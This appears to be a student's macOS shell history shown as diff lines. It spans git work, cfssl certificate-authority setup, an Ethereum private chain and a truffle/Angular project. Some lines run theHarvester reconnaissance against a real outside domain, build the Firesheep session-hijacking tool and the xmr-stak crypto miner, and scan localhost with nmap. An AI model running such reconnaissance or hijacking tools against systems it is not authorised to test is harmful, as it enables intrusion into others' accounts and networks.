+: 1535911793:0;cd data-wrangling-templates
+: 1535911797:0;git pull
+: 1535911824:0;git add .
+: 1535911832:0;git commit -m "Lessons path."
+: 1535911851:0;git push
+: 1535912513:0;git add .
+: 1535912516:0;git commit -m "Lessons path."
+: 1535912520:0;git push
+: 1535912582:0;git add .
+: 1535912585:0;git commit
+: 1535912606:0;git commit -m "First case study."
+: 1535912610:0;git push
+: 1535912661:0;git add .
+: 1535912664:0;git commit -m "First case study."
+: 1535912668:0;git push
+: 1535912711:0;git add .
+: 1535912725:0;git commit -m "Second case study."
+: 1535912728:0;git push
+: 1535912774:0;git add .
+: 1535912776:0;git commit -m "Second case study."
+: 1535912779:0;git push
+: 1535912884:0;git add .
+: 1535912891:0;git commit -m "Second case study."
+: 1535912894:0;git push
+: 1535912946:0;brew install git-lfs
+: 1535912955:0;ls
+: 1535912958:0;cd
+: 1535912978:0;cd "/Users/baroness/Documents/201802/CS-DS001 Data Wrangling (A)"
+: 1535912982:0;cd data-wrangling-templates
+: 1535912993:0;brew install git-lfs
+: 1535913133:0;find . -name .DS_Store -print0 | xargs -0 git rm --ignore-unmatch
+: 1535913174:0;find . -name .DS_Store -print0 | xargs -0 git rm --ignore-unmatch -f
+: 1535913204:0;git config --global core.excludesfile ~/.gitignore
+: 1535913213:0;echo .DS_Store >> ~/.gitignore
+: 1535913219:0;git add .
+: 1535913241:0;git commit -m "Hidden OSX files exclusion."
+: 1535913247:0;git push
+: 1535914155:0;git lfs install
+: 1535914165:0;git lfs install --system
+: 1535914171:0;sudo git lfs install --system
+: 1536106877:0;theharvester
+: 1536107013:0;theharvester -d http://www.tas-seguridad.com/
+: 1536107030:0;theHarvester.py -d http://www.tas-seguridad.com/
+: 1536107052:0;theharvester -d tas-seguridad.com
+: 1536107089:0;theharvester -d tas-seguridad.com -l 10 -b all
+: 1536107170:0;theharvester -d tas-seguridad.com -l 1000 -b all -h tas-resultados.html
+: 1536108041:0;ls
+: 1536109370:0;ping 74.208.215.116 
+: 1536260558:0;brew cask install xampp
+: 1536281178:0;brew cask uninstall ramboxpro
+: 1536337180:0;brew install autoconf automake libtool boost
+: 1536337304:0;git clone https://github.com/codebutler/firesheep.git
+: 1536337312:0;cd firesheep
+: 1536337318:0;git submodule update --init
+: 1536337326:0;./autogen.sh
+: 1536337347:0;make
+: 1536337404:0;./autogen.sh
+: 1536337423:0;make
+: 1536337440:0;ls
+: 1536337452:0;cd
+: 1536337459:0;rm -r firesheep
+: 1536337466:0;rm -r firesheep -all
+: 1536337475:0;rm -r firesheep -f
+: 1536337512:0;rm -rf firesheep
+: 1536337638:0;brew uninstall autoconf automake libtool boost
+: 1536443449:0;cd "/Users/baroness/Documents/201802/CS-DS001 Data Wrangling (A)/data-wrangling-templates"
+: 1536443453:0;git add .
+: 1536443492:0;git add . && git commit -m "Solar eclipse prediction case added." && git push
+: 1536795192:0;sudo apachectl stop
+: 1536795227:0;htop
+: 1536795301:0;netstat
+: 1536795339:0;netstat -ap tcp | grep -i "listen"
+: 1536795386:0;sudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist
+: 1536796707:0;killall httpd
+: 1536798340:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)"
+: 1536798344:0;git init
+: 1536798352:0;git clone https://github.com/fluproject/flu.git
+: 1536798358:0;ls
+: 1536798361:0;cd flu
+: 1536798364:0;ls
+: 1536798495:0;cp -R "Servidor web" "/Users/baroness/.bitnami/stackman/machines/xampp/volumes/root/htdocs"
+: 1536798976:0;brew cask install bettergram
+: 1536866286:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/ca-key.pem"
+: 1536866388:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/config_ca.json"
+: 1536866513:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/ca-key.pem"
+: 1536866896:0;at "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/ca-key.pem"
+: 1536866902:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/ca-key.pem"
+: 1536866966:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/ca.csr"
+: 1536867241:0;cfssl-trust -d ./cert.db -b int expiring
+: 1536867326:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1536867484:0;gencert
+: 1536867568:0;cat "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/csr_ca.json"
+: 1536867676:0;nano csr_client.json
+: 1536867745:0;nano config_client.json
+: 1536867813:0;cfssl gencert -config config_client.json csr_client.json | cfssljson -bare db
+: 1536867820:0;cfssl
+: 1536867845:0;cfssl serve
+: 1536867932:0;cfssl -h
+: 1536867939:0;sudo cfssl
+: 1536867948:0;cfssl -help
+: 1536868062:0;go env
+: 1536868097:0;go ver
+: 1536868101:0;go version
+: 1536868205:0;update-golang\
+
+: 1536868214:0;go -h
+: 1536868328:0;brew -h
+: 1536868341:0;brew list
+: 1536868394:0;cd $GOPATH/src/github.com/cloudflare/cfssl/
+: 1536868429:0;go version
+: 1536868582:0;cfssl -h
+: 1536868587:0;go init
+: 1536868590:0;ho -h
+: 1536868592:0;go -h
+: 1536868606:0;gopath
+: 1536868614:0;go gopath get
+: 1536868617:0;go gopathget
+: 1536868619:0;go gopath-get
+: 1536868624:0;go gopath
+: 1537119184:0;brew cask install the-unarchiver
+: 1537165130:0;brew cask geogebra
+: 1537165136:0;brew cask install geogebra
+: 1537197671:0;brew cask install cakebrew
+: 1537200742:0;brew cask install ramme
+: 1537213121:0;brew cask install pencil
+: 1537222953:0;brew cask install postman
+: 1537224097:0;go
+: 1537224113:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)"
+: 1537224156:0;ls
+: 1537224183:0;cat config_ca.json
+: 1537224292:0;cfssl
+: 1537224414:0;brew install cfssl
+: 1537224619:0;cfssl
+: 1537224683:0;cfssl gencert -config config_client.json csr_client.json | cfssljson -bare db
+: 1537224885:0;cfssl gencert -initca csr_ca.json | cfssljson -bare ca
+: 1537224896:0;ls
+: 1537224950:0;cfssl serve -ca-key ca-key.pem -ca ca.pem -config config_ca.json
+: 1537225024:0;sublime config_ca.json
+: 1537225064:0;ln -s "/Applications/Sublime Text.app/Contents/SharedSupport/bin/subl" /usr/local/bin/sublime
+: 1537225067:0;sublime config_ca.json
+: 1537225913:0;cfssl serve -ca-key ca-key.pem -ca ca.pem -config config_ca.json
+: 1537226066:0;ls
+: 1537226123:0;cfssl gencert -config=ca-config.json
+: 1537226264:0;sudo cfssl gencert -config=ca-config.json
+: 1537226392:0;cd -- "$(\
+	dirname "${0}"\
+)" || exit 1\
+\
+readonly CA_ROOT_CERT_KEY="ca-root"\
+readonly CA_INTERMEDIATE_CERT_KEY="ca-intermediate"\
+readonly CF_COMMANDS="\
+	cfssl\
+	cfssljson\
+"\
+readonly SERVER_CERT_KEY="localhost"\
+\
+HOSTNAMES\
+REGENERATE="${1:-false}"\
+SERVER_HOST_NAME="${2:-localhost.localdomain}"\
+SERVER_LOCAL_HOST_NAME="${3:-localhost}"\
+SERVER_PUBLIC_HOST_NAMES="${4:-}"\
+\
+for COMMAND in ${CF_COMMANDS}; do\
+	if ! command -v ${COMMAND} &> /dev/null; then\
+		echo "ERROR: Missing command ${COMMAND}" >&2\
+		echo "Install the package from: https://pkg.cfssl.org/" >&2\
+		exit 1\
+	fi\
+done\
+\
+tee ca-config.json 1> /dev/null <<-CONFIG\
+{\
+	"signing": {\
+		"default": {\
+			"expiry": "8760h"\
+		},\
+		"profiles": {\
+			"server": {\
+				"expiry": "43800h",\
+				"usages": [\
+					"signing",\
+					"key encipherment",\
+					"server auth"\
+				]\
+			},\
+			"client": {\
+				"expiry": "43800h",\
+				"usages": [\
+					"signing",\
+					"key encipherment",\
+					"client auth"\
+				]\
+			},\
+			"client-server": {\
+				"expiry": "43800h",\
+				"usages": [\
+					"signing",\
+					"key encipherment",\
+					"server auth",\
+					"client auth"\
+				]\
+			}\
+		}\
+	}\
+}\
+CONFIG\
+\
+tee ca-root-to-intermediate-config.json 1> /dev/null <<-CONFIG\
+{\
+	"signing": {\
+		"default": {\
+			"expiry": "43800h",\
+			"ca_constraint": {\
+				"is_ca": true,\
+				"max_path_len": 0,\
+				"max_path_len_zero": true\
+			},\
+			"usages": [\
+				"digital signature",\
+				"cert sign",\
+				"crl sign",\
+				"signing"\
+			]\
+		}\
+	}\
+}\
+CONFIG\
+\
+if [[ ! -f ${CA_ROOT_CERT_KEY}-key.pem ]]; then\
+	cfssl genkey \\
+		-initca \\
+		- \\
+		<<-CONFIG | cfssljson -bare ${CA_ROOT_CERT_KEY}\
+	{\
+		"CN": "(LOCAL) ROOT CA",\
+		"key": {\
+			"algo": "rsa",\
+			"size": 2048\
+		},\
+		"names": [\
+			{\
+				"C": "--",\
+				"ST": "STATE",\
+				"L": "LOCALITY",\
+				"O": "ORGANISATION",\
+				"OU": "LOCAL"\
+			}\
+		],\
+		"ca": {\
+			"expiry": "131400h"\
+		}\
+	}\
+	CONFIG\
+else\
+	echo "${CA_ROOT_CERT_KEY}-key.pem already generated."\
+fi\
+\
+if [[ ! -f ${CA_INTERMEDIATE_CERT_KEY}-key.pem ]]; then\
+	cfssl gencert \\
+		-initca \\
+		- \\
+		<<-CONFIG | cfssljson -bare ${CA_INTERMEDIATE_CERT_KEY}\
+	{\
+		"CN": "(LOCAL) CA",\
+		"key": {\
+			"algo": "rsa",\
+			"size": 2048\
+		},\
+		"names": [\
+			{\
+				"C": "--",\
+				"ST": "STATE",\
+				"L": "LOCALITY",\
+				"O": "ORGANISATION",\
+				"OU": "LOCAL"\
+			}\
+		],\
+		"ca": {\
+			"expiry": "43800h"\
+		}\
+	}\
+	CONFIG\
+else\
+	echo "${CA_INTERMEDIATE_CERT_KEY}-key.pem already generated."\
+fi\
+\
+if [[ ! -f ${CA_INTERMEDIATE_CERT_KEY}.pem ]] \\
+	|| [[ ${REGENERATE} == true ]]; then\
+	set -x\
+	# Sign intermediate certificate with root certificate\
+	cfssl sign \\
+		-ca ${CA_ROOT_CERT_KEY}.pem \\
+		-ca-key ${CA_ROOT_CERT_KEY}-key.pem \\
+		-config ca-root-to-intermediate-config.json \\
+		${CA_INTERMEDIATE_CERT_KEY}.csr \\
+	| cfssljson -bare ${CA_INTERMEDIATE_CERT_KEY}\
+\
+	if [[ -f ${HOME}/Library/Keychains/login.keychain ]]; then\
+		echo "Adding intermediate certificate to keychain"\
+		echo "You will need to manually set to 'Always Trust' using Keychain Access."\
+		sudo security \\
+			add-trusted-cert \\
+			-r trustRoot \\
+			-k "${HOME}/Library/Keychains/login.keychain" \\
+			"${CA_INTERMEDIATE_CERT_KEY}.pem"\
+	fi\
+	set +x\
+fi\
+\
+echo -e "\nDistribute the intermediate certificate: ${CA_INTERMEDIATE_CERT_KEY}.pem"\
+cat ${CA_INTERMEDIATE_CERT_KEY}.pem\
+\
+## Server certificate\
+cfssl gencert \\
+	-ca ${CA_INTERMEDIATE_CERT_KEY}.pem \\
+	-ca-key ${CA_INTERMEDIATE_CERT_KEY}-key.pem \\
+	-config ca-config.json \\
+	-profile server \\
+	-hostname "${SERVER_HOST_NAME},${SERVER_LOCAL_HOST_NAME}${SERVER_PUBLIC_HOST_NAMES:+, }${SERVER_PUBLIC_HOST_NAMES}" \\
+	- \\
+	<<-CONFIG | cfssljson -bare ${SERVER_CERT_KEY}\
+{\
+	"CN": "${SERVER_HOST_NAME}",\
+	"key": {\
+		"algo": "rsa",\
+		"size": 2048\
+	}\
+}\
+CONFIG\
+\
+echo -e "\nserver private key:"\
+cat ${SERVER_CERT_KEY}-key.pem\
+\
+echo -e "\nserver certificate:"\
+cat ${SERVER_CERT_KEY}.pem\
+\
+rm ca-config.json\
+rm ca-root-to-intermediate-config.json\
+\
+echo -e "\nUpdating Apache Configuration: /etc/pki/tls/certs/${SERVER_CERT_KEY}.crt"\
+sudo bash -c "{ \\
+	mkdir -p /etc/pki/tls/certs; \\
+	cat ${SERVER_CERT_KEY}-key.pem \\
+		${SERVER_CERT_KEY}.pem \\
+		${CA_INTERMEDIATE_CERT_KEY}.pem \\
+	> /etc/pki/tls/certs/${SERVER_CERT_KEY}.crt; \\
+}"
+: 1537226410:0;ls
+: 1537226469:0;cd "/Users/baroness/Downloads/7f7bb957a4e8e0304f0df070f3cbcbee-0cb2fb080c0f52b419303a9f937492a87a2e0cd9/"
+: 1537226481:0;ls
+: 1537226486:0;./make-local-cert.sh
+: 1537226497:0;ls
+: 1537288973:0;export PATH=$PATH=:~/cfssl/bin/
+: 1537289102:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/PKI (public key infrastructure)/PKI 3"
+: 1537289239:0;sublime csr_ROOT_CA.json
+: 1537289875:0;cfssl gencert -initca csr_ROOT_CA.json | cfssljson -bare root_ca
+: 1537290114:0;sublime intermediate_ca.csr
+: 1537290237:0;sublime root_to_intermediate_ca.json
+: 1537290451:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca
+: 1537290671:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca.csr
+: 1537291243:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca
+: 1537292408:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca.json
+: 1537292664:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca
+: 1537292690:0;cfssl gencert -initca root_to_intermediate_ca.csr.json | cfssljson -bare intermediate_ca
+: 1537292769:0;cfssl gencert -initca root_to_intermediate_ca.json | cfssljson -bare intermediate_ca
+: 1537294127:0;cfssl gencert -initca csr_INTERMEDIATE_CA.json | cfssljson -bare intermediate_ca
+: 1537294196:0;cfssl sign -ca root_ca.pem -ca-key root_ca-key.pem -config root_to_intermediate_ca.json intermediate_ca.csr | cfssljson -bare intermediate_ca
+: 1537294432:0;sublime csr_END_DEVICE.json
+: 1537294569:0;sublime intermediate_to_client_cert.json
+: 1537294958:0;cfssl gencert -ca intermediate_ca.pem -ca-key intermediate_ca-key.pem -config intermediate_to_client_cert.json csr_stb_teste_rsa.json | cfssljson -bare end_device
+: 1537294976:0;cfssl gencert -ca intermediate_ca.pem -ca-key intermediate_ca-key.pem -config intermediate_to_client_cert.json csr_END_DEVICE.json | cfssljson -bare end_device
+: 1537295581:0;brew tap ethereum/ethereum
+: 1537295626:0;brew install ethereum
+: 1537295672:0;geth account new
+: 1537295809:0;geth -h
+: 1537296090:0;geth
+: 1537296210:0;cd /Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain
+: 1537296731:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain"
+: 1537296768:0;mkdir chaindata
+: 1537296802:0;sublime genesis.json
+: 1537296881:0;geth --datadir=./chaindata/ init ./genesis.json
+: 1537296949:0;geth --datadir=./chaindata/
+: 1537297043:0;geth --datadir=./chaindata/ --port "30304"
+: 1537297250:0;brew cask install brave
+: 1537305686:0;brew cask install mist
+: 1537381258:0;cd
+: 1537381261:0;git init
+: 1537381267:0;git clone https://github.com/fireice-uk/xmr-stak.git
+: 1537381270:0;ls
+: 1537381276:0;cd xmr-stak
+: 1537381278:0;ls
+: 1537381307:0;brew install hwloc libmicrohttpd gcc openssl cmake
+: 1537381627:0;sublime  xmr-stak/xmrstak/donate-level.hpp 
+: 1537381656:0;cd xmrstak/donate-level.hpp 
+: 1537381670:0;cd xmrstak
+: 1537381672:0;ls
+: 1537381681:0;sublime donate-level.hpp
+: 1537406818:0;cd ..
+: 1537406824:0;cmake . -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
+: 1537406834:0;make install
+: 1537406905:0;ls
+: 1537406924:0;xmr-stak -h
+: 1537407100:0;./xmr-stak
+: 1537407114:0;.xmr-stak
+: 1537407119:0;./xmr-stak
+: 1537407166:0;cd bin
+: 1537407169:0;./xmr-stak
+: 1537407418:0;nmap localhost
+: 1537407442:0;nmap -h
+: 1537407496:0;nmap localhost -r
+: 1537407563:0;nmap localhost -r -vv --open
+: 1537407575:0;nmap localhost -r -vv
+: 1537407594:0;nmap localhost -p 0101
+: 1537414739:0;ifconfig
+: 1537415091:0;xmr-stak --help
+: 1537415097:0;./xmr-stak --help
+: 1537415110:0;cd xmr-stak/xmrstak
+: 1537415113:0;./xmr-stak --help
+: 1537415119:0;ls
+: 1537415123:0;cd ..
+: 1537415126:0;cd bin
+: 1537415130:0;./xmr-stak --help
+: 1537415329:0;./xmr-stak -p
+: 1537415925:0;cd ..
+: 1537415926:0;ls
+: 1537415937:0;cd xmrstak
+: 1537415938:0;ls
+: 1537415950:0;cd ..
+: 1537415951:0;ls
+: 1537415964:0;cd bin && ls
+: 1537415979:0;sublime cpu.txt && sublime config.txt
+: 1537416164:0;./xmr-stak
+: 1537416649:0;sublime /etc/security/limits.conf
+: 1537417136:0;./xmr-stak
+: 1537417541:0;sudo sysctl -w vm.nr_hugepages=128
+: 1537423997:0;geth -h
+: 1537450603:0;./xmr-stak
+: 1537463415:0;sublime cpu.txt && sublime config.txt
+: 1537463592:0;nmap localhost -p 0101
+: 1537463636:0;nmap localhost -r
+: 1537465950:0;cd..
+: 1537465952:0;cd ..
+: 1537465955:0;ls
+: 1537465964:0;rm -r xmr-stak -f
+: 1537465974:0;ls
+: 1537466248:0;git init
+: 1537466254:0;git clone https://github.com/fireice-uk/xmr-stak.git
+: 1537466422:0;cd xmr-stak
+: 1537466426:0;ls
+: 1537466433:0;cd xmr-stak
+: 1537466439:0;cd xmrstak
+: 1537466464:0;cmake . -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
+: 1537466471:0;dc ..
+: 1537466473:0;cd ..
+: 1537466474:0;ls
+: 1537466476:0;cmake . -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
+: 1537466485:0;make install
+: 1537466772:0;cd bin
+: 1537466781:0;ls
+: 1537466796:0;./xmr-stak
+: 1537467203:0;cd xmr-stak/xmrstak
+: 1537467205:0;ls
+: 1537467217:0;cd ..
+: 1537467218:0;ls
+: 1537467226:0;cd bin && ls
+: 1537467235:0;sublime cpu.txt && sublime config.txt
+: 1537468376:0;brew cask install discord
+: 1537482350:0;cd xmr-stak/xmrstak
+: 1537482352:0;cd ..
+: 1537482355:0;cd bin
+: 1537482358:0;./xmr-stak
+: 1537483989:0;brew doctor
+: 1537484000:0;brew prune
+: 1537484119:0;brew link --overwrite node
+: 1537484147:0;cd /Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon prep
+: 1537484154:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon prep"
+: 1537484222:0;npm install -g truffle
+: 1537484585:0;ls
+: 1537484606:0;mkdir election
+: 1537484612:0;cd election
+: 1537484624:0;truffle unbox pet-shop
+: 1537484741:0;ls
+: 1537485006:0;cd contracts
+: 1537485014:0;sublime Elections.sol
+: 1537485231:0;cd ..
+: 1537485234:0;cd migrations
+: 1537485249:0;ls
+: 1537485259:0;sublime 2_deploy_contracts.js
+: 1537485334:0;truffle migrate
+: 1537485618:0;geth
+: 1537485640:0;truffle migrate
+: 1537488383:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain/chaindata"
+: 1537488497:0;geth info
+: 1537488500:0;geth -h
+: 1537488546:0;geth dumpvalue
+: 1537488550:0;geth dumpconfigvalue
+: 1537488561:0;geth dumpconfig
+: 1537489176:0;geth --datadir="~/Documents/201802/CS044 Blockchain (A)/Hackathon prep" --rpc
+: 1537489262:0;geth --datadir="~/Documents/201802/CS044 Blockchain (A)/Hackathon prep" --nodiscover --rpc
+: 1537489396:0;truffle migrate
+: 1537489486:0;geth --datadir="/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon prep" --port "30304"
+: 1537489536:0;truffle migrate
+: 1537489564:0;geth --datadir="/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon prep" --port "30304" --nodiscover --rpc
+: 1537489569:0;truffle migrate
+: 1537489739:0;truffle console
+: 1537489800:0;testrpc
+: 1537489811:0;truffle test
+: 1537490211:0;cd /Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain/chaindata
+: 1537490213:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain/chaindata"
+: 1537490221:0;geth --datadir=./chaindata/ init ./genesis.json
+: 1537490236:0;cd ..
+: 1537490238:0;geth --datadir=./chaindata/ init ./genesis.json
+: 1537490270:0;geth --datadir=./chaindata/
+: 1537493416:0;open -a /Applications/Mist.app --args --rpcport "8001" --rpc  "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Private chain/chaindata/geth.ipc"
+: 1537503046:0;cd ..
+: 1537503053:0;git init
+: 1537503056:0;git clone https://github.com/armi3/web-app.git
+: 1537503074:0;cd web-app
+: 1537503107:0;ls
+: 1537503123:0;npm install
+: 1537503344:0;ng serve
+: 1537503352:0;ls
+: 1537503406:0;npm start
+: 1537504518:0;ng serve
+: 1537504530:0;brew angular
+: 1537504538:0;brew install angular
+: 1537504673:0;npm install -g @angular/cli
+: 1537504732:0;npm install -g @angular/cli --save
+: 1537504766:0;ng serve
+: 1537504988:0;import {environment} from 'src/environments/environment';
+: 1537538943:0;cd ..
+: 1537538959:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537538965:0;git init
+: 1537538974:0;git clone https://github.com/armi3/web-app.git
+: 1537539004:0;cd web-app
+: 1537539006:0;ls
+: 1537539019:0;npm install
+: 1537539144:0;ng serve
+: 1537539215:0;npm install --save-dev @angular/cli@latest
+: 1537539419:0;npm install --save @angular/cli@latest
+: 1537539486:0;npm install --save @types/jquery@latest
+: 1537539543:0;npm install --save popper.js
+: 1537539574:0;npm install --save jquery
+: 1537539624:0;ng serve
+: 1537539739:0;npm install --save environment
+: 1537539827:0;node-gyp rebuild
+: 1537539831:0;npm install --save environment
+: 1537539879:0;npm install --save --force environment
+: 1537539914:0;npm audit fix
+: 1537539976:0;ng serve
+: 1537540333:0;npm install --save @environment/environment@latest
+: 1537540355:0;npm install --save environment@latest
+: 1537540436:0;npm install --save events.js
+: 1537540550:0;npm install --save node-gyp rebuild
+: 1537541712:0;ls
+: 1537546119:0;node -v
+: 1537546134:0;npm install -g truffle
+: 1537546253:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537546260:0;mkdir pet-shop-tutorial
+: 1537546266:0;cd pet-shop-tutorial
+: 1537546277:0;truffle unbox pet-shop
+: 1537547133:0;ls
+: 1537547158:0;tree ls
+: 1537547163:0;tree
+: 1537547168:0;tree -h
+: 1537547193:0;cd contracts
+: 1537547203:0;sublime Adoption.sol
+: 1537550229:0;ls
+: 1537550300:0;cd ..
+: 1537550305:0;truffle compile
+: 1537550420:0;cd migrations
+: 1537550430:0;sublime 2_deploy_contracts.js
+: 1537550649:0;cd ..
+: 1537550655:0;truffle migrate
+: 1537550728:0;cd
+: 1537550742:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/pet-shop-tutorial"
+: 1537550744:0;ls
+: 1537550746:0;cd test
+: 1537550747:0;ls
+: 1537550756:0;sublime TestAdoption.sol
+: 1537565186:0;cd .. 
+: 1537565189:0;cd ..
+: 1537565196:0;git init
+: 1537565198:0;git clone https://github.com/Tortolala/Q-i-.git
+: 1537565308:0;cd Q-i-
+: 1537565433:0;truffle compile
+: 1537565450:0;ls
+: 1537565667:0;cd contracts
+: 1537565668:0;ls
+: 1537565678:0;rm MetaCoin.sol
+: 1537565682:0;rm ConvertLib.sol
+: 1537565749:0;sublime pwd
+: 1537565778:0;pwd
+: 1537565786:0;git statusﾃｧ
+: 1537565792:0;git status
+: 1537565827:0;git checkout .
+: 1537565832:0;git status
+: 1537565840:0;git pull
+: 1537565847:0;git flow init
+: 1537565856:0;git add .
+: 1537565884:0;gt commit -m "C.R."
+: 1537565892:0;git commit -m "C.R."
+: 1537565902:0;git add .
+: 1537565904:0;git commit -m "C.R."
+: 1537565909:0;cd ..
+: 1537565912:0;git add .
+: 1537565915:0;git commit -m "C.R."
+: 1537565917:0;git push
+: 1537566032:0;git flow init
+: 1537566058:0;git flow feature start smartcontracts
+: 1537566067:0;git branch
+: 1537566083:0;cd contracts
+: 1537566093:0;sublime User.sol
+: 1537566112:0;sublime Profile.sol
+: 1537566153:0;cd ..
+: 1537566160:0;git add .
+: 1537566163:0;git commit
+: 1537566181:0;git commit -m "Smart contracts."
+: 1537566185:0;git push
+: 1537569863:0;truffle compile
+: 1537569871:0;truffle migrate
+: 1537569992:0;git flow feature finish smartcontracts
+: 1537570000:0;git status
+: 1537570005:0;git add .
+: 1537570018:0;git commit -m "Smart contracts ready for first testing."
+: 1537570020:0;git push
+: 1537570033:0;git push --set-upstream origin feature/smartcontracts
+: 1537570044:0;git branch
+: 1537572985:0;ls
+: 1537572988:0;cd contracts
+: 1537572990:0;ls
+: 1537574545:0;git pull
+: 1537574838:0;git add .
+: 1537574852:0;git commit -m "User autodestruct."
+: 1537574857:0;git push
+: 1537579588:0;ls
+: 1537579596:0;sublime Qi.sol
+: 1537579608:0;git add .
+: 1537579620:0;git commit -m "Qi class."
+: 1537579623:0;git push
+: 1537579644:0;cd ..
+: 1537579646:0;git push
+: 1537579662:0;git pull
+: 1537579680:0;git push
+: 1537579840:0;git pull
+: 1537579885:0;git rebase master
+: 1537579891:0;git add .
+: 1537579903:0;git commit -m ﾂｨ"C.R."
+: 1537579905:0;git rebase master
+: 1537580054:0;git add .
+: 1537580062:0;git commit -m "C.R."
+: 1537580072:0;git rebase --continue
+: 1537580135:0;git clone https://github.com/Tortolala/Q-i-.git
+: 1537580141:0;ls
+: 1537580149:0;cd ..
+: 1537580164:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537580167:0;git init
+: 1537580171:0;git clone https://github.com/Tortolala/Q-i-.git
+: 1537580200:0;git-flow init
+: 1537580221:0;git branch
+: 1537580245:0;git flow feature start contracts
+: 1537580256:0;git branch
+: 1537580301:0;git add .
+: 1537580328:0;cd Q-i-
+: 1537580330:0;git init
+: 1537580341:0;git branch
+: 1537580352:0;git flow feature start contracts
+: 1537580357:0;git-flow init
+: 1537580398:0;git add .
+: 1537580410:0;git commit -m "Contracts update."
+: 1537580413:0;git push
+: 1537580420:0;ls
+: 1537592375:0;git pull
+: 1537592480:0;git add .
+: 1537592493:0;git commit -m "Contracts update."
+: 1537592496:0;git push
+: 1537592531:0;git flow feature finish contracts
+: 1537592539:0;git branch
+: 1537592905:0;git-flow init
+: 1537592922:0;git branch
+: 1537593580:0;git pull
+: 1537593591:0;git branch
+: 1537593631:0;git branch master
+: 1537593652:0;git checkout
+: 1537593658:0;git checkout master
+: 1537593663:0;git pull
+: 1537595164:0;truffle compile
+: 1537595196:0;git status
+: 1537595210:0;git pull
+: 1537595228:0;git branch
+: 1537601244:0;git branch chekout develop
+: 1537601246:0;git branch
+: 1537601266:0;git checkout develop
+: 1537601338:0;npm install
+: 1537601463:0;ng serve
+: 1537601658:0;ls
+: 1537601663:0;cd src && ls
+: 1537601675:0;cd app
+: 1537601677:0;ls
+: 1537604146:0;npm install --save web3
+: 1537605343:0;npm install --save -g npm
+: 1537606344:0;npm start
+: 1537606352:0;ng serve
+: 1537606494:0;ng generate service contracts
+: 1537606510:0;cd src/app/contracts.service.ts
+: 1537606514:0;sublime src/app/contracts.service.ts
+: 1537606532:0;sublime src/app/contracts.service.spec.ts
+: 1537606905:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537606914:0;git init
+: 1537606968:0;git clone https://github.com/cryptoufm/Q-i-.git
+: 1537607007:0;ls
+: 1537607082:0;cd q-i-
+: 1537607084:0;ls
+: 1537607090:0;npm install
+: 1537607349:0;ng serve
+: 1537607522:0;ng generate service contracts
+: 1537607548:0;npm install --save web3
+: 1537607627:0;cd src
+: 1537607629:0;ls
+: 1537607634:0;cd app
+: 1537607635:0;ls
+: 1537607662:0;sublime contracts.service.ts
+: 1537607711:0;sublime contracts.service.specs.ts
+: 1537607948:0;sublime CollectionContract.json
+: 1537607979:0;sublime QiContract.json
+: 1537608004:0;sublime OwnerContract.json
+: 1537608018:0;sublime RegistryContract.json
+: 1537608127:0;cd ..
+: 1537608141:0;git-flow init
+: 1537622064:0;cd ..
+: 1537622081:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537622085:0;git init
+: 1537622130:0;git clone https://github.com/cryptoufm/Q-i-.git
+: 1537622136:0;git-flow init
+: 1537622149:0;cd q-i-
+: 1537622153:0;git-flow init
+: 1537622179:0;git branch
+: 1537622192:0;ng serve
+: 1537622197:0;npm install
+: 1537622337:0;ng serve
+: 1537622475:0;truffle compile
+: 1537622550:0;truffle migrate
+: 1537622916:0;ls
+: 1537622922:0;sublime truffle.js
